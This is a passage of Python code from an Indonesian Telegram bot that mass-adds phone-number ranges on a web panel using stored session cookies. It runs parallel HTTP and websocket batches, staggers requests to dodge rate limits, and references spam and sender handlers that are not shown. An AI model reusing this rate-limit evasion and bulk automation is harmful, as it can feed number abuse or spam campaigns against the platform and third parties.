            progress_msg = await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=f"{em(E5,'🏴‍☠️')} <b>BATCH PROCESSING DIMULAI</b>\n\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"{em(CE_EMAIL,'📩')} Email: {email}\n"
                     f"{em(E1,'⭐')} Total Range: {len(universal_ranges)}\n"
                     f"{em(E1,'⭐')} Per Range: 1 nomor\n"
                     f"{em(E1,'⭐')} Total Target: {len(universal_ranges)} nomor\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                     f"{em(E2,'⭐')} <b>Range yang akan diproses:</b>\n{preview_text}\n\n"
                     f"{em(CE_LOADING,'🟠')} <i>Memproses...</i>",
                parse_mode=ParseMode.HTML
            )

            
            count_per_range = 1

            
            asyncio.create_task(
                process_batch_ranges(
                    progress_msg,
                    user_id,
                    email,
                    universal_ranges,
                    count_per_range,
                    session,
                    csrf
                )
            )

            
            await query.answer(f" Memproses {len(universal_ranges)} range", show_alert=False)

        except Exception as e:
            print(f"[CRITICAL] Error di universal_batch_exec: {e}")
            import traceback
            traceback.print_exc()
            
            try:
                await query.edit_message_text(
                    f"{em(E2, '⭐')} <b>ERROR</b>\n\n{str(e)[:100]}",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_back_keyboard(user_id)
                )
            except:
                await query.message.reply_text(
                    f" Error: {str(e)[:100]}",
                    reply_markup=get_back_keyboard(user_id)
                )

            
    elif data.startswith('universal_batch_'):
        try:
            parts = data.split('_')
            
            
            if 'exec' in parts:
                return  
            
            if len(parts) >= 3:
                
                if not parts[2].isdigit():
                    await query.answer(" Format data tidak valid", show_alert=True)
                    return
                    
                target_user = int(parts[2])

                if target_user != user_id and user_id != USER_ID:
                    await query.answer(" Bukan untuk kamu!", show_alert=True)
                    return

                
                email, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
                
                if not logged_in or not cookies_dict or not csrf:
                    await query.edit_message_text(
                        f"{em(E2,'⭐')} Session expired! Silahkan login ulang.", 
                        parse_mode=ParseMode.HTML,
                        reply_markup=get_back_keyboard(user_id)
                    )
                    return

                
                universal_ranges = context.user_data.get(f'universal_ranges_{user_id}', [])
                if not universal_ranges:
                    await query.edit_message_text(
                        " Tidak ada data range! Silahkan cari ulang.",
                        parse_mode=ParseMode.HTML,
                        reply_markup=get_back_keyboard(user_id)
                    )
                    return

                
                await query.edit_message_text(
                    f"{em(E5,'🏴‍☠️')} <b>BATCH PROCESSING</b>\n\n"
                    f"{em(CE_EMAIL,'📩')} Email: {email}\n"
                    f"{em(E1,'⭐')} Total Range: {len(universal_ranges)}\n\n"
                    f"Pilih jumlah per range:",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([
                        [
                            InlineKeyboardButton(" 1", callback_data=f"universal_batch_exec_{user_id}_1", style="primary")
                        ],
                        [InlineKeyboardButton("BATAL", callback_data=f"menu_addrange_{user_id}", icon_custom_emoji_id="5870601874175954911", style="danger")]
                    ])
                )
            else:
                await query.answer(" Format data tidak valid", show_alert=True)
        except Exception as e:
            print(f"Error universal_batch_: {e}")
            await query.answer(" Error", show_alert=True)

    elif data.startswith('universal_socket5_'):
        try:
            parts = data.split('_')
            target_user = int(parts[2])
            
            if target_user != user_id and user_id != USER_ID:
                await query.answer(" Bukan untuk kamu!", show_alert=True)
                return
                
            email, _, _, _, _, _, logged_in = get_user_session(user_id)
            if not logged_in:
                await query.answer(" Session expired!", show_alert=True)
                return
                
            universal_ranges = context.user_data.get(f'universal_ranges_{user_id}', [])
            if not universal_ranges:
                await query.answer(" Data range kosong!", show_alert=True)
                return
                
            display_ranges = universal_ranges[:5]
            
            await query.edit_message_text(
                f"{em(E5,'🏴‍☠️')} <b>BATCH SOCKET PROGRESS</b>\n\n"
                f"{em(CE_EMAIL,'📩')} Email: {email}\n"
                f"{em(E1,'⭐')} Total Range: {len(display_ranges)}\n\n"
                f"{em(CE_LOADING,'🟠')} <i>Sedang memproses satu per satu via Websocket...</i>",
                parse_mode=ParseMode.HTML
            )
            
            # Start background task
            asyncio.create_task(process_socket5_batch(query.message, user_id, email, display_ranges))
            
        except Exception as e:
            logging.getLogger(__name__).error(f"Error universal_socket5_: {e}")
            await query.answer(" Error memproses permintaan", show_alert=True)

    
    elif data.startswith('stop_batch_'):
        target_user = int(data.split('_')[2])
        
        if user_id != target_user and user_id != USER_ID:
            await query.answer(" Bukan task kamu!", show_alert=True)
            return
        
        
        try:
            cur.execute("UPDATE active_tasks SET cancel_flag = 1 WHERE user_id = ? AND task_id LIKE ?", 
                       (user_id, f"add_{user_id}_%"))
            conn.commit()
        except:
            pass
        
        await query.answer("⏹️ Proses batch akan dihentikan...")

    
    elif data.startswith('bulk_confirm_'):
        await bulk_confirm_callback(update, context)
        return
    
    
    elif data.startswith('menu_export_'):
        if not check_user_login(user_id):
            await query.edit_message_text(
                _build(TEMPLATE_ERROR, 'GAGAL', message="Kamu belum login!"),
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        await query.edit_message_text(
            _build(TEMPLATE_EXPORT, 'EXPORT DAFTAR NOMOR'),
            parse_mode=ParseMode.HTML,
            reply_markup=get_export_keyboard(user_id)
        )
    
    
    elif data.startswith('export_xlsx_') or data.startswith('export_txt_'):
        parts = data.split('_')
        format_type = parts[1]
        target_user = int(parts[-1])
        
        if target_user != user_id:
            await query.answer(" Bukan untuk kamu!", show_alert=True)
            return
        
        if not check_user_login(user_id):
            await query.edit_message_text(
                _build(TEMPLATE_ERROR, 'GAGAL', message="Session expired! Login ulang."),
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        _, _, _, _, cookies_dict, csrf, _ = get_user_session(user_id)
        
        session = requests.Session()
        for key, value in cookies_dict.items():
            session.cookies.set(key, value)
        
        await query.edit_message_text(
            f"{em(CE_LOADING,'🟠')} <i>Mendownload file {format_type.upper()}...</i>",
            parse_mode=ParseMode.HTML
        )
        
        asyncio.create_task(process_export_background(
            query.message, user_id, format_type, context, session, csrf
        ))
    
    
    elif data.startswith('top_refresh_'):
        target_user = int(data.split('_')[2])
        
        if target_user != user_id:
            await query.answer(" Bukan untuk kamu!", show_alert=True)
            return
        
        await query.edit_message_text(
            f"{em(CE_LOADING,'🟠')} <i>Merefresh data...</i>",
            parse_mode=ParseMode.HTML
        )
        
        asyncio.create_task(process_top_refresh_background(query.message, user_id))
    
    elif data.startswith('all_refresh_'):
        target_user = int(data.split('_')[2])
        
        if target_user != user_id and user_id != USER_ID:
            await query.answer(" Bukan untuk kamu!", show_alert=True)
            return
        
        if not check_user_login(user_id):
            await query.edit_message_text(
                " Kamu belum login!",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        await query.edit_message_text(
            f"{em(CE_LOADING,'🟠')} <i>Merefresh data platform...</i>",
            parse_mode=ParseMode.HTML
        )
        
        asyncio.create_task(process_all_platforms_background(query.message, user_id))
    
        
    elif data.startswith('all_menu_'):
        target_user = int(data.split('_')[2])
        
        if target_user != user_id and user_id != USER_ID:
            await query.answer(" Bukan untuk kamu!", show_alert=True)
            return
        
        
        if not check_user_login(user_id):
            await query.edit_message_text(
                " Kamu belum login! Gunakan /cookies dulu.",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        await query.edit_message_text(
            f"{em(CE_LOADING,'🟠')} <i>Mengambil data semua platform...</i>",
            parse_mode=ParseMode.HTML
        )
        

        asyncio.create_task(process_all_platforms_background(query.message, user_id))

    
    elif data.startswith('menu_close_'):
        await query.message.delete()

    # ── Login export callbacks ──
    elif data.startswith('loginexp_'):
        await _handle_loginexp_callback(query, data, user_id, context)

    # ── Sessions management callbacks ──
    elif data.startswith('sessions_'):
        await _handle_sessions_callback(query, data, user_id)

    # ── Sender management callbacks ──
    elif data.startswith('sender_'):
        await _handle_sender_callback(query, data, user_id, context)

    # ── TG Check callbacks ──
    elif data.startswith('tgcheck_') or data.startswith('spam_api_') or data.startswith('spam_app_') or data.startswith('spam_stop_'):
        await _handle_tgcheck_callback(query, data, user_id, context)


def process_live_add_with_id(email, range_name, termination_id, user_id=None):
    """Add nomor via HTTP dengan termination_id yang sudah diketahui"""
    try:
        session, csrf, _ = get_user_session(user_id)
        if not session or not csrf:
            return {'success': 0, 'failed': 1, 'method': 'http', 'error': 'No session'}
        
        
        result = add_number(session, csrf, termination_id)
        
        if result.get('success'):
            return {'success': 1, 'failed': 0, 'method': 'http'}
        else:
            
            msg = result.get('message', '').lower()
            if any(k in msg for k in MAX_NUMBERS_KEYWORDS) and user_id:
                bulk_success, _ = bulk_return_numbers(session, csrf)
                if bulk_success:
                    time.sleep(1)
                    result2 = add_number(session, csrf, termination_id)
                    if result2.get('success'):
                        return {'success': 1, 'failed': 0, 'auto_bulk_done': True, 'method': 'http'}
            
            return {'success': 0, 'failed': 1, 'method': 'http', 'error': result.get('message', 'Unknown')}
        
    except Exception as e:
        print(f"Error in process_live_add_with_id: {e}")
        return {'success': 0, 'failed': 1, 'method': 'http', 'error': str(e)}

async def process_live_add_background(msg, user_id, email, range_name, termination_id, count, task_id):
    """Background process untuk add dari live SMS"""

    start_time = time.time()
    msg_ref = msg
    
    
    try:
        cur.execute("INSERT INTO active_tasks (task_id, user_id, cancel_flag) VALUES (?, ?, 0)", (task_id, user_id))
        conn.commit()
    except Exception as e:
        logger.error(f"Error saving task: {e}")
    
    success = 0
    failed = 0
    
    for i in range(count):
        
        await msg_ref.edit_text(
            f"{em(CE_LOADING,'🟠')} <b>Memproses {i+1}/{count}</b>\n{em(E1,'⭐')} <code>{range_name[:30]}</code>\n{em(E2,'⭐')} <code>{email}</code>",
            parse_mode=ParseMode.HTML
        )
        
        
        result = await bg.run(user_id, process_live_add_with_id, email, range_name, termination_id, user_id)
        
        if result.get('success'):
            success += 1
        else:
            failed += 1
        
        
        if i < count - 1:
            await asyncio.sleep(1)
    
    total_time = int(time.time() - start_time)
    
    
    try:
        cur.execute("DELETE FROM active_tasks WHERE task_id = ?", (task_id,))
        conn.commit()
    except Exception as e:
        logger.error(f"Error deleting task: {e}")
    
    
    bulk_info = ""
    if result.get('auto_bulk_done'):
        bulk_info = f"\n  🔄 <b>Auto Bulk</b>: Nomor lama dihapus otomatis"
    
    if success > 0:
        text = f"""{em(E1, '⭐')} <b>BERHASIL MENAMBAH NOMOR</b>

{EMOJI['LINE']}
{em(CE_PROFILE,'👤')} USER: {user_id}
{em(CE_EMAIL,'📩')} EMAIL: {email}
{em(E1,'⭐')} RANGE: {range_name[:30]}

{em(E1,'⭐')} SUKSES: {success}/{count}
{em(CE_WAKTU,'⏲')} WAKTU: {total_time} detik
{bulk_info}
{EMOJI['LINE']}"""
    else:
        text = f"""{em(E2, '⭐')} <b>GAGAL MENAMBAH NOMOR</b>

{EMOJI['LINE']}
{em(CE_PROFILE,'👤')} USER: {user_id}
{em(CE_EMAIL,'📩')} EMAIL: {email}
{em(E1,'⭐')} RANGE: {range_name[:30]}

{em(E2,'⭐')} GAGAL: {failed}/{count}
{em(CE_WAKTU,'⏲')} WAKTU: {total_time} detik
{bulk_info}
{EMOJI['LINE']}
{em(E4,'🎧')} Coba dengan range lain"""

    
    try:
        await msg_ref.edit_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(" LIVE SMS LAGI", callback_data=f"live_sms_{user_id}", style="success"),
                InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
            ]])
        )
    except Exception as e:
        logger.error(f"Error sending result: {e}")

async def add_range_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command /addrange - Format: range|negara (contoh: 51919|peru)"""
    if not is_allowed_user(update.effective_user.id):
        return
    try:
        user_id = update.effective_user.id
        chat_type = update.effective_chat.type

        
        if chat_type != "private":
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>PERINGATAN</b>\n\n Fitur ini hanya bisa digunakan di Private Chat!",
                parse_mode=ParseMode.HTML
            )
            return

        
        if not context.args:
            await update.message.reply_text(
                f"{em(E5,'🏴‍☠️')} <b>CARA PENGGUNAAN ADDRANGE</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{em(E1,'⭐')} Format: <code>/addrange [kode]|[negara]</code>\n\n"
                f"{em(E2,'⭐')} <b>Contoh:</b>\n"
                f"• <code>/addrange 59127|bolivia</code>\n"
                f"• <code>/addrange 51919|peru</code>\n"
                f"• <code>/addrange 614|australia</code>\n"
                f"• <code>/addrange 447|uk</code>\n"
                f"• <code>/addrange 62|indonesia</code>\n\n"
                f"{em(E2,'⭐')} Atau ketik langsung:\n"
                f"<code>59127|bolivia</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{em(E4,'🎧')} <i>Powered by DikZz</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return

        
        input_text = " ".join(context.args)
        if '|' in input_text:
            parts = input_text.split('|', 1)
            search_term = parts[0].strip()
            country_filter = parts[1].strip().upper()
        else:
            search_term = input_text
            country_filter = ""

        
        email, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
        
        if not logged_in or not cookies_dict or not csrf:
            await update.message.reply_text(
                f"{em(E2,'⭐')} Kamu belum login! Gunakan /cookies dulu.",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return

        
        session = requests.Session()
        for key, value in cookies_dict.items():
            session.cookies.set(key, value)

        email, _, _, _, _, _, _ = get_user_session(user_id)

        
        msg = await update.message.reply_text(
            f"{em(CE_ADD,'✨')} Mencari range dengan kode: {search_term}\n"
            f"{em(E2,'⭐')} Filter negara: {country_filter if country_filter else 'SEMUA'}\n\n"
            f"{em(CE_LOADING,'🟠')} <i>Mohon tunggu...</i>",
            parse_mode=ParseMode.HTML
        )

        
        asyncio.create_task(process_search_range_background(
            msg, user_id, email, search_term, country_filter, session, csrf, context
        ))

    except Exception as e:
        logger.error(f"Error add_range_command: {e}")
        await update.message.reply_text(
            f" Error: {str(e)[:100]}",
            reply_markup=get_back_keyboard(update.effective_user.id)
        )

async def process_search_range_background(msg, user_id, email, search_term, country_filter, session, csrf, context):
    """Proses pencarian range di background - DENGAN FILTER BERDASARKAN NOMOR"""

    try:
        all_ranges = []
        
        for page in range(1, 4):  
            results = await asyncio.get_event_loop().run_in_executor(
                None, search_numbers, session, csrf, search_term, page
            )
            
            if not results or 'data' not in results:
                break
            
            data = results.get('data', [])
            if not data:
                break
            
            for item in data:
                range_name = item.get('range', '').strip()
                
                
                test_number_html = item.get('test_number', '')
                
                
                test_number = None
                if test_number_html:
                    
                    number_match = re.search(r'>(\d+)<', test_number_html)
                    if number_match:
                        test_number = number_match.group(1)
                    else:
                        
                        numbers = re.findall(r'\d+', test_number_html)
                        if numbers:
                            test_number = max(numbers, key=len)  
                
                
                if not test_number or search_term not in test_number:
                    continue
                
                
                if country_filter and country_filter not in range_name.upper():
                    continue
                    
                term_id = item.get('id')
                if not term_id:
                    continue
                
                limit_str = item.get('Limit_Range', '200000')
                try:
                    limit_range = int(limit_str)
                except:
                    limit_range = 200000
                
                all_ranges.append({
                    'name': range_name,
                    'term_id': str(term_id),
                    'test_number': test_number,
                    'limit': limit_range
                })
            
            if len(data) < 50:
                break
            
            await asyncio.sleep(0.5)

        
        if search_term.isdigit() and all_ranges:
            search_num = int(search_term)
            
            for r in all_ranges:
                
                numbers = re.findall(r'\d+', r['name'])
                if numbers:
                    range_num = int(numbers[-1])  
                    r['diff'] = abs(range_num - search_num)
                else:
                    r['diff'] = 999999
            
            
            all_ranges.sort(key=lambda x: x.get('diff', 999999))

        if not all_ranges:
            await msg.edit_text(
                f"{em(E2,'⭐')} <b>Tidak ada range ditemukan</b>\n\n"
                f"{em(E1,'⭐')} Kode: <code>{search_term}</code>\n"
                f"{em(E2,'⭐')} Filter: <code>{country_filter if country_filter else 'SEMUA'}</code>\n\n"
                f"Tidak ditemukan nomor test yang mengandung kode {search_term}",
                parse_mode=ParseMode.HTML,
                reply_markup=get_result_keyboard(user_id)
            )
            return

        
        display_ranges = all_ranges[:10]
        
        
        ranges_text = ""
        for i, r in enumerate(display_ranges, 1):
            ranges_text += f"{em(E2,'⭐')} <b>{i}.</b> <code>{r['name']}</code>\n    {em(CE_NOMOR,'⭐')} <code>{r['test_number']}</code> | Limit: <code>{r['limit']:,}</code>\n\n"

        text = f"""{em(E5,'🏴‍☠️')} <b>HASIL PENCARIAN</b>
━━━━━━━━━━━━━━━━━━━━━━
{em(E1,'⭐')} <b>Kode</b>: <code>{search_term}</code>
{em(E2,'⭐')} <b>Filter</b>: <code>{country_filter if country_filter else 'SEMUA'}</code>
{em(E1,'⭐')} <b>Ditemukan</b>: <code>{len(all_ranges)} range</code> (menampilkan 10)
━━━━━━━━━━━━━━━━━━━━━━

{ranges_text}
{em(CE_LOADING,'🟠')} Filter berdasarkan nomor test yang mengandung <code>{search_term}</code>
━━━━━━━━━━━━━━━━━━━━━━
{em(E4,'🎧')} <i>Powered by DikZz</i>"""

        
        keyboard = []
        for r in display_ranges:
            display = r['name'][:18] + ".." if len(r['name']) > 18 else r['name']
            emoji_id = get_flag_custom_emoji_id(r['name'])
            keyboard.append([
                InlineKeyboardButton(
                    f"{display} - {r['test_number'][-6:]}", 
                    callback_data=f"universal_select_{r['term_id']}_{r['name']}_{user_id}",
                    icon_custom_emoji_id=emoji_id,
                    style="primary"
                )
            ])
        
        
        if len(display_ranges) > 1:
            keyboard.append([
                InlineKeyboardButton(
                    f" PROSES {len(display_ranges)} RANGE (HTTP)", 
                    callback_data=f"universal_batch_{user_id}",
                    style="success"
                )
            ])
            if len(all_ranges) >= 5:
                keyboard.append([
                    InlineKeyboardButton(
                        f" PROSES 5 RANGE (SOCKET)", 
                        callback_data=f"universal_socket5_{user_id}",
                        style="success"
                    )
                ])
            elif len(all_ranges) > 1:
                keyboard.append([
                    InlineKeyboardButton(
                        f" PROSES {len(all_ranges)} RANGE (SOCKET)", 
                        callback_data=f"universal_socket5_{user_id}",
                        style="success"
                    )
                ])
        
        keyboard.append([
            InlineKeyboardButton("CARI LAGI", callback_data=f"menu_addrange_{user_id}", style="primary"),
            InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
        ])

        await msg.edit_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
        
        
        context.user_data[f'universal_ranges_{user_id}'] = display_ranges
        
        
        term_id_map = {}
        for r in display_ranges:
            term_id_map[r['term_id']] = r['name']
        
        
        context.user_data[f'term_id_map_{user_id}'] = term_id_map
        
        
        context.user_data[f'last_search_{user_id}'] = {
            'search_term': search_term,
            'country_filter': country_filter,
            'timestamp': time.time()
        }
        
        print(f"[DEBUG] Data tersimpan di context: {len(display_ranges)} range, {len(term_id_map)} mapping")
        

    except Exception as e:
        logger.error(f"Error process_search_range_background: {e}")
        await msg.edit_text(
            f" Error: {str(e)[:100]}",
            parse_mode=ParseMode.HTML,
            reply_markup=get_result_keyboard(user_id)
        )
        
async def process_add_range_task(msg, user_id, email, range_name, term_id, count, session, csrf):
    """Task dengan queue per user"""

    global request_queue  
    success = 0
    failed = 0
    start_time = time.time()
    last_update = time.time()
    
    for i in range(count):
        try:
            
            result = await queued_add_number(user_id, session, csrf, term_id)
            
            if result and result.get('success'):
                success += 1
            else:
                failed += 1
                reason = result.get('reason', 'unknown')
                
                if reason == 'account_full':
                    await msg.edit_text(
                        f"⛔ <b>ACCOUNT FULL</b>\n\n{em(E1,'⭐')} {range_name[:30]}\n{em(E1,'⭐')} Sukses: {success}\n{em(E2,'⭐')} Gagal: {failed}",
                        parse_mode=ParseMode.HTML
                    )
                    break
                elif reason == 'max_limit':
                    break
        
        except Exception as e:
            print(f" Error: {e}")
            failed += 1
        
        now = time.time()
        if now - last_update > 3 or i == count-1:
            try:
                percent = int((i+1) / count * 100)
                bar = "█" * int(percent/5) + "░" * (20 - int(percent/5))
                elapsed = int(now - start_time)
                
                await msg.edit_text(
                    f"⚡ <b>Progress</b> [{i+1}/{count}] {percent}%\n{bar}\n\n"
                    f"{em(E1,'⭐')} {range_name[:30]}\n"
                    f"{em(E1,'⭐')} Sukses: {success}\n"
                    f"{em(E2,'⭐')} Gagal: {failed}\n"
                    f"⏱️ {elapsed}s | ⚡ Queue: {request_queue.processing}",
                    parse_mode=ParseMode.HTML
                )
                last_update = now
            except:
                pass
        
        
        queue_size = request_queue.queues[user_id].qsize()
        dynamic_delay = 0.2 + (queue_size * 0.05)
        await asyncio.sleep(dynamic_delay)
    
    
    elapsed = int(time.time() - start_time)
    
    keyboard = [
        [
            InlineKeyboardButton("TAMBAH LAGI", callback_data=f"universal_select_{term_id}_{range_name}_{user_id}", icon_custom_emoji_id=CE_ADD, style="success"),
            InlineKeyboardButton("CARI LAGI", callback_data=f"menu_addrange_{user_id}", style="primary")
        ],
        [InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")]
    ]

    if success > 0:
        result_text = f"""{em(E1, '⭐')} <b>SELESAI</b>

━━━━━━━━━━━━━━━━━━━━━━
{em(E1,'⭐')} {range_name[:30]}
{em(E1,'⭐')} Target: {count}

{em(E1,'⭐')} Sukses: {success}
{em(E2,'⭐')} Gagal: {failed}
⚡ Kecepatan: {count/elapsed:.1f}/detik
⏱️ Waktu: {elapsed} detik
━━━━━━━━━━━━━━━━━━━━━━"""
    else:
        result_text = f"""{em(E2, '⭐')} <b>GAGAL SEMUA</b>

━━━━━━━━━━━━━━━━━━━━━━
{em(E1,'⭐')} {range_name[:30]}
{em(E1,'⭐')} Target: {count}

{em(E1,'⭐')} Sukses: {success}
{em(E2,'⭐')} Gagal: {failed}
⏱️ Waktu: {elapsed} detik
━━━━━━━━━━━━━━━━━━━━━━"""

    await msg.edit_text(result_text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))

async def queued_add_number(user_id, session, csrf, termination_id):
    """Add number dengan queue - auto retry 3x"""

    global request_queue  
    
    for attempt in range(3):
        try:
            return await request_queue.add_request(
                user_id, add_number, session, csrf, termination_id, 1
            )
        except Exception as e:
            if attempt == 2:
                raise
            await asyncio.sleep(1)

async def process_socket5_batch(msg, user_id, email, ranges):
    print(f"\n[SOCKET BATCH START] user={user_id} | ranges={len(ranges)}")
    total_success = 0
    total_failed = 0
    start_time = time.time()
    done_count = 0
    total = len(ranges)

    # 1. Pre-bulk delete to clean old numbers first
    try:
        await msg.edit_text(
            f"{em(E5,'🏴‍☠️')} <b>BATCH SOCKET PROGRESS</b> [0/{total}] 0%\n"
            f"<code>░░░░░░░░░░░░░░░░░░░░</code>\n\n"
            f"{em(CE_HAPUS,'🗑')} <b>Membersihkan nomor lama (Auto-Bulk)...</b>\n"
            f"{em(CE_LOADING,'🟠')} <i>Mohon tunggu...</i>",
            parse_mode=ParseMode.HTML
        )
        _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
        if logged_in and cookies_dict and csrf:
            session = requests.Session()
            for key, value in cookies_dict.items():
                session.cookies.set(key, value)
            await bg.run(user_id, bulk_return_numbers, session, csrf)
    except Exception as e:
        print(f"[SOCKET BATCH PRE-BULK ERROR] {e}")


    # Parallelisme dibatasi agar tidak melebihi max_per_email socket pool
    CONCURRENCY = min(5, total) if total > 0 else 1
    sem = asyncio.Semaphore(CONCURRENCY)
    loop = asyncio.get_running_loop()
    progress_lock = asyncio.Lock()

    async def update_progress(current_name=""):
        try:
            percent = int(done_count / total * 100) if total else 100
            bar = "█" * int(percent/5) + "░" * (20 - int(percent/5))
            await msg.edit_text(
                f"{em(E5,'🏴‍☠️')} <b>BATCH SOCKET PROGRESS</b> [{done_count}/{total}] {percent}%\n<code>{bar}</code>\n\n"
                f"{em(E1,'⭐')} <code>{current_name[:30]}</code>\n"
                f"{em(E2,'⭐')} Sukses: {total_success} | Gagal: {total_failed}\n\n"
                f"⚡ Paralel x{CONCURRENCY} via Websocket...",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass

    async def run_one(idx, r):
        nonlocal total_success, total_failed, done_count
        range_name = r['name']
        # stagger ringan agar tidak burst sekaligus
        await asyncio.sleep(idx * 0.1)
        async with sem:
            print(f"  → {idx+1}/{total} | {range_name}")
            result = await loop.run_in_executor(None, process_chat_add_single, email, range_name, user_id)
            async with progress_lock:
                done_count += 1
                if result and result.get('success') > 0:
                    total_success += 1
                else:
                    total_failed += 1
                # update progress sesekali (tiap selesai 1, tapi non-blocking jika gagal)
                await update_progress(range_name)

    await asyncio.gather(*[run_one(idx, r) for idx, r in enumerate(ranges)])
        
    try:
        percent = 100
        bar = "█" * 20
        elapsed = int(time.time() - start_time)
        await msg.edit_text(
            f"✅ <b>BATCH SOCKET SELESAI</b>\n<code>{bar}</code>\n\n"
            f"📊 <b>HASIL AKHIR:</b>\n"
            f"✅ Sukses: {total_success}\n"
            f"❌ Gagal: {total_failed}\n"
            f"⏱️ Waktu: {elapsed} detik",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("CARI LAGI", callback_data=f"menu_addrange_{user_id}", style="primary"),
                    InlineKeyboardButton("EXPORT NOMOR", callback_data=f"menu_export_{user_id}", style="primary")
                ],
                [
                    InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
                ]
            ])
        )
    except Exception:
        pass

async def process_batch_ranges(msg, user_id, email, universal_ranges, count_per_range, session, csrf):
    import random
    print("\n" + "="*70)
    print(f"[BATCH START] user={user_id} | ranges={len(universal_ranges)} | per_range={count_per_range}")
    print("="*70)

    total_success = 0
    total_failed = 0
    results = []
    start_time = time.time()
    msg_ref = msg
    MAX_RETRY = 0  # 0 = retry tak terbatas sampai sukses atau account_full
    total = len(universal_ranges)

    # 1. Pre-bulk delete to clean old numbers first
    try:
        await msg_ref.edit_text(
            f"{em(E5,'🏴‍☠️')} <b>BATCH PROGRESS</b> [0/{total}] 0%\n"
            f"<code>░░░░░░░░░░░░░░░░░░░░</code>\n\n"
            f"{em(CE_HAPUS,'🗑')} <b>Membersihkan nomor lama (Auto-Bulk)...</b>\n"
            f"{em(CE_LOADING,'🟠')} <i>Mohon tunggu...</i>",
            parse_mode=ParseMode.HTML
        )
        await bg.run(user_id, bulk_return_numbers, session, csrf)
    except Exception as e:
        print(f"[HTTP BATCH PRE-BULK ERROR] {e}")

    progress_lock = asyncio.Lock()
    done_count = 0

    async def process_single(idx, r):
        nonlocal total_success, total_failed, done_count
        # Stagger start untuk meminimalisir 429
        await asyncio.sleep(idx * 0.15)
        
        range_success = 0
        range_failed = 0
        
        print(f"  → {idx+1}/{total} | {r['name']} | id={r['term_id']}")
        
        # add_number sudah auto retry tak terbatas sampai sukses atau account_full
        try:
            result = await bg.run(user_id, add_number, session, csrf, r['term_id'])
            print(f"[DEBUG] Hasil add {r['name']}: {result}")
            
            if result and result.get('success'):
                range_success += 1
                print(f"[DEBUG] SUKSES {r['name']}")
            else:
                range_failed += 1
                print(f"[DEBUG] GAGAL FINAL {r['name']}")
        except Exception as e:
            logger.error(f"Error batch: {e}")
            print(f"[DEBUG] EXCEPTION {r['name']}: {e}")
            range_failed += 1
            
        async with progress_lock:
            done_count += 1
            total_success += range_success
            total_failed += range_failed
            
            try:
                percent = int(done_count / total * 100) if total else 100
                bar = "█" * int(percent/5) + "░" * (20 - int(percent/5))
                await msg_ref.edit_text(
                    f"{em(E5,'🏴‍☠️')} <b>BATCH PROGRESS</b> [{done_count}/{total}] {percent}%\n<code>{bar}</code>\n\n"
                    f"{em(E1,'⭐')} <code>{r['name'][:30]}</code>\n"
                    f"{em(E2,'⭐')} Sukses: {total_success} | Gagal: {total_failed}\n\n"
                    f"⚡ Paralel x{total} via HTTP...",
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
                    
        return {
            'name': r['name'],
            'success': range_success,
            'failed': range_failed
        }

    tasks = [process_single(idx, r) for idx, r in enumerate(universal_ranges)]
    completed_results = await asyncio.gather(*tasks)
    
    for r in completed_results:
        total_success += r['success']
        total_failed += r['failed']
        results.append(r)

    elapsed = int(time.time() - start_time)
    print(f"[DEBUG] Batch selesai dalam {elapsed} detik")
    print(f"[DEBUG] Total sukses: {total_success}, Total gagal: {total_failed}")
    
    success_rate = (total_success / len(universal_ranges)) * 100 if universal_ranges else 0
    kecepatan = total_success / elapsed if elapsed > 0 else total_success
    
    result_text = f"""{em(E5,'🏴‍☠️')} <b>BATCH SELESAI</b>
━━━━━━━━━━━━━━━━━━━━━━
{em(CE_EMAIL,'📩')} <b>Email</b>: <code>{email}</code>
{em(E1,'⭐')} <b>Target</b>: <code>{len(universal_ranges)}</code> nomor

✅ <b>Sukses</b>: <code>{total_success}</code>
❌ <b>Gagal</b>: <code>{total_failed}</code>
{em(E1,'⭐')} <b>Rate</b>: <code>{success_rate:.1f}%</code>
{em(E1,'⭐')} <b>Kecepatan</b>: <code>{kecepatan:.1f}</code>/detik
{em(CE_WAKTU,'⏲')} <b>Waktu</b>: <code>{elapsed}</code> detik
━━━━━━━━━━━━━━━━━━━━━━

<b>Detail per range:</b>"""

    for i, res in enumerate(results[:10]):
        status = "✓" if res['success'] > 0 else "✗"
        result_text += f"\n{status} <code>{res['name'][:25]}</code>"
    
    if len(results) > 10:
